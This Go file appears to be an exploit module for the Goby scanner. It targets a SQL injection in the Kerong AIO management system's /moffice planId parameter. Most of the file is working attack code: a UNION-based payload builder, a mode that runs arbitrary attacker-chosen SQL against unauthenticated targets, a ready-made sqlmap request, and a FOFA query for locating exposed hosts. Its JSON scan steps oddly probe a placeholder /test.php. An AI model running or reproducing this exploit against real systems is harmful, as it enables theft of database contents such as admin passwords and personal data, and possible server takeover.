package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cooperation-AIO-MS /moffice planId Param SQL Injection Vulnerability",
    "Description": "<p>Kerong AIO Enterprise Integrated Management Solution solves the general and personalized problems of many enterprise customers in the management process through ERPERP (purchase, sale and inventory finance), OAOA (office automation), CRMCRM (customer relationship management), UDPUDP (custom platform), e-commerce platform, payment platform, ERP platform, WeChat platform, mobile APP, etc. </p><p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Product": "Cooperation-AIO-MS",
    "Homepage": "https://www.koronsoft.com/",
    "DisclosureDate": "2024-08-16",
    "PostTime": "2024-10-27",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"changeAccount('\" && header=\"Apache-Coyote/1.1\"",
    "GobyQuery": "body=\"changeAccount('\" && header=\"Apache-Coyote/1.1\"",
    "Level": "1",
    "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/140060359"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "科荣AIO管理系统 /moffice planId 参数 SQL 注入漏洞",
            "Product": "科荣AIO管理系统",
            "Description": "<p>科荣AIO 企业⼀体化管理解决方案 通过ERPERP（进销存财务）、OAOA（办公自动化）、CRMCRM（客户关系管理）、UDPUDP（自定义平台），集电子商务平台、支付平台、ERP 平台、微信平台、移动APP 等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。<br></p><p>科荣AIO moffice 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>科荣AIO moffice 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Cooperation-AIO-MS /moffice planId Param SQL Injection Vulnerability",
            "Product": "Cooperation-AIO-MS",
            "Description": "<p>Kerong AIO Enterprise Integrated Management Solution solves the general and personalized problems of many enterprise customers in the management process through ERPERP (purchase, sale and inventory finance), OAOA (office automation), CRMCRM (customer relationship management), UDPUDP (custom platform), e-commerce platform, payment platform, ERP platform, WeChat platform, mobile APP, etc.&nbsp;</p><p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`
	setSqlPayloadHashasyhdgagsdtuyagsduhafusdyayhsfgahsfdkugasydfgcastufctkadfcsdafasfasffrrgf := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `1' UNION ALL SELECT NULL,(`+sql+`),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewGetRequestConfig(sqlUrl + "?op=showWorkPlan&sid=1&planId=" + sql)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/moffice"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/moffice"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "qvjxqmQo"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `select CHAR(113)+CHAR(118)+CHAR(106)+CHAR(120)+CHAR(113)+CHAR(109)+CHAR(81)+CHAR(111)`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `"empName":"([\s\S]*?)",`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasyhdgagsdtuyagsduhafusdyayhsfgahsfdkugasydfgcastufctkadfcsdafasfasffrrgf
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `GET /moffice?op=showWorkPlan&sid=1&planId=%31%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%28%73%65%6c%65%63%74%20%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%38%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%30%39%29%2b%43%48%41%52%28%38%31%29%2b%43%48%41%52%28%31%31%31%29%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20 HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `"empName":"([\s\S]*?)",`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasyhdgagsdtuyagsduhafusdyayhsfgahsfdkugasydfgcastufctkadfcsdafasfasffrrgf
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select DB_NAME()"
					} else if way == "db_version" {
						sql = "select @@VERSION"
					} else if way == "user_name" {
						sql = "select SYSTEM_USER"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
